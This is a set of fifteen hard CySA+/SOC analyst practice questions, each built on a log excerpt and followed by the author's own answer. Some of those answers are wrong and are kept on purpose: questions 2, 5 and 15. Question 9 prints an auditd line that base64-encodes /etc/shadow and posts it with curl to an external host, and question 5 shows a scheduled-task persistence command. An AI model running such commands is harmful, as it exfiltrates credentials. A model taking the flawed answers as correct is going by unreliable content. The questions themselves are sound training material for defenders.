==============================
007-hard-technical-cysa-questions.txt
Author: ViliusDevX
Purpose: Very Hard Technical CySA+ / SOC Analyst Practice
Difficulty: Very Hard / Weird / Misleading
==============================

!!!RAW ANSWERS ONLY — KEEP MISTAKES AND UNCERTAINTY!!!

==================================================
SECTION 1 — VERY HARD TECHNICAL QUESTIONS (15)
==================================================


Question 1

Evaluate the following firewall log:

kernel: iptables FORWARD DROP IN=eth1 OUT=eth0 SRC=10.20.4.55 DST=198.51.100.44 PROTO=TCP SPT=50122 DPT=443 SYN

Which interpretation is MOST accurate?

A. The local host blocked traffic destined to itself on TCP/443
B. The firewall dropped a DNS query leaving the internal network
C. The firewall blocked routed outbound HTTPS connection initiation
D. The destination server rejected an established inbound connection

My Answer:

C, because its outbound https traffic and its blocked "DROP"

--------------------------------------------------


Question 2

A packet capture shows the following TCP flags:

SRC=203.0.113.10 SPT=443 DST=10.1.5.25 DPT=51244 FLAGS=SYN,ACK

Which statement is MOST accurate?

A. The external HTTPS server is responding to a client connection attempt
B. The internal workstation is initiating an outbound HTTPS connection
C. The internal workstation is rejecting an inbound TLS negotiation attempt
D. The external HTTPS server is initiating a new connection to the client

My Answer:

D, because its three way handshake from https to dynamic port

--------------------------------------------------


Question 3

A Zeek conn.log entry contains:

id.orig_h=10.3.9.20 id.resp_h=203.0.113.70 id.resp_p=22 proto=tcp service=ssh history=ShR duration=0.02 orig_bytes=0 resp_bytes=0

Which interpretation is BEST?

A. The SSH connection completed and transferred data successfully
B. The originator sent data before the responder acknowledged it
C. The responder accepted the connection and then sent payload data
D. The connection was attempted, but the responder reset it quickly

My Answer:

D, because in conn.log "ShR" means connection was quickly closed by the responder

--------------------------------------------------


Question 4

A Windows Security event shows:

Event ID: 4624
Logon Type: 3
Authentication Package: NTLM
Account Name: backup_svc
Source Network Address: 10.0.8.44

Shortly afterward, the same account accesses \\FS01\C$.

What should the analyst suspect FIRST?

A. Interactive keyboard login at the file server console
B. Network logon using a service account to access admin shares
C. Remote desktop session with full graphical user interaction
D. Kerberos ticket renewal without resource access activity

My Answer:

B

--------------------------------------------------


Question 5

A Sysmon Event ID 11 shows:

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Public\update.ps1

A later Event ID 1 shows:

Image: C:\Windows\System32\schtasks.exe
CommandLine: schtasks /Create /SC MINUTE /MO 5 /TN UpdateCheck /TR "powershell -File C:\Users\Public\update.ps1"

What is the BEST interpretation?

A. PowerShell wrote a temporary browser cache file and then removed it
B. The user manually scheduled a normal Windows cumulative update task
C. A script was staged and configured for recurring execution as persistence
D. The system automatically rotated a service account credential every minute

My Answer:

D, because "/SC MINUTE" probably means execution every minute

--------------------------------------------------


Question 6

A Suricata alert contains:

alert http any any -> any any (msg:"Possible path traversal"; content:"../"; http_uri; nocase; sid:300111;)

Which field should the analyst inspect FIRST to confirm the rule matched the attempted path?

A. http_uri
B. tls.sni
C. dns.rrname
D. flow_id

My Answer:

A

--------------------------------------------------


Question 7

A DNS log shows repeated queries:

_ldap._tcp.dc._msdcs.corp.local SRV
_kerberos._tcp.corp.local SRV

From a newly joined Windows workstation during first boot.

Which conclusion is MOST appropriate?

A. The workstation is performing DNS tunneling through SRV records
B. The workstation is attempting Kerberoasting against SQL services
C. The workstation is exfiltrating encoded data to a rare domain
D. The workstation is discovering domain services and domain controllers

My Answer:

D, because other options don't make sense

--------------------------------------------------


Question 8

A Windows Security log shows many events:

Event ID: 4769
Service Name: MSSQLSvc/db01.corp.local:1433
Ticket Encryption Type: 0x17
Account Name: normal.user

Why might this be relevant during threat hunting?

A. Event 4769 with RC4 always proves successful domain compromise
B. RC4 service tickets for SPNs can be useful Kerberoasting evidence
C. MSSQL service names prove DNS tunneling over TCP port 1433
D. Kerberos service ticket events only appear during password resets

My Answer:

B

--------------------------------------------------


Question 9

A Linux auditd event shows:

type=EXECVE msg=audit(1718801111.456:802): argc=3 a0="bash" a1="-c" a2="cat /etc/shadow | base64 | curl -X POST --data-binary @- https://198.51.100.20/upload"

Which activity is MOST directly indicated?

A. Credential file access followed by encoded upload over HTTPS
B. Normal package verification using a signed repository mirror
C. Local user enumeration without any network transfer activity
D. DNS tunneling using TXT record responses and cached resolvers

My Answer:

A

--------------------------------------------------


Question 10

An nginx access log shows:

10.1.9.77 - - "GET /admin HTTP/1.1" 302
10.1.9.77 - - "GET /login HTTP/1.1" 200
10.1.9.77 - - "POST /login HTTP/1.1" 401
10.1.9.77 - - "POST /login HTTP/1.1" 401
10.1.9.77 - - "POST /login HTTP/1.1" 200

Which interpretation is BEST?

A. The user received a forbidden response before any authentication attempt
B. The web server failed DNS resolution and then accepted anonymous access
C. The client was redirected to login and later authenticated after failures
D. The HTTP 302 confirms exploitation of a remote code execution flaw

My Answer:

C, because 302 means "Found" and 401 means "Unauthorized", 200 is "Ok"

--------------------------------------------------


Question 11

A NetFlow record shows:

src=10.8.4.20 dst=203.0.113.90 dst_port=443 bytes_out=2400 bytes_in=780000000 duration=3600

What should the analyst conclude FIRST?

A. The host likely uploaded a large amount of internal data externally
B. The host likely downloaded a large amount of data from the remote system
C. The flow proves DNS tunneling because the destination used HTTPS
D. The flow proves lateral movement because the destination is public

My Answer:

B, because host received big amount of bytes

--------------------------------------------------


Question 12

A TLS log shows:

sni=login-microsoftonline-security.com
subject=CN=login-microsoftonline-security.com
issuer=Let's Encrypt
not_before=2026-06-08
ja3=72a589da586844d7f0818ce684948eea

A user clicked a Microsoft 365 security alert email five minutes earlier.

Which conclusion is MOST defensible?

A. The domain is legitimate because it contains microsoftonline
B. The certificate issuer proves the destination is Microsoft owned
C. JA3 alone proves the destination is a phishing website
D. The lookalike SNI and recent certificate support phishing investigation

My Answer:

D, because other options kinda don't make sense

--------------------------------------------------


Question 13

A Windows event shows:

Event ID: 7045
Service Name: AdobeUpdateSvc
Service File Name: C:\Users\Public\adobe_update.exe
Start Type: auto start
Account Name: LocalSystem

Which response is MOST appropriate FIRST?

A. Investigate as possible service-based persistence before deleting evidence
B. Ignore because all Adobe update services run from the Public directory
C. Reboot immediately to remove volatile memory before collecting evidence
D. Close the alert because LocalSystem services cannot be malicious

My Answer:

A

--------------------------------------------------


Question 14

A SIEM correlation rule fires when:

ParentImage endswith WINWORD.EXE
Image endswith powershell.exe
CommandLine contains -EncodedCommand
DestinationPort equals 443 within 60 seconds

What does this rule BEST detect?

A. Kerberos pre-authentication failure from a domain controller
B. Normal Office document printing followed by TLS certificate renewal
C. Malicious document execution leading to encoded PowerShell C2 behavior
D. DNS service discovery from a workstation joining Active Directory

My Answer:

C, because of encoded powershell command execution from Word

--------------------------------------------------


Question 15

A Linux auth.log shows:

sshd[1441]: Accepted publickey for deploy from 10.0.5.44 port 51902 ssh2
sudo: deploy : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/rsync -av /srv/data/ backup@203.0.113.55:/tmp/sync/

Which statement is MOST accurate?

A. The log proves password spraying because the login used publickey
B. The log proves DNS tunneling because rsync uses encoded subdomains
C. The log shows a local-only backup with no external network connection
D. The log shows privileged rsync transfer to an external host requiring validation

My Answer:

C

==============================
END OF FILE
==============================
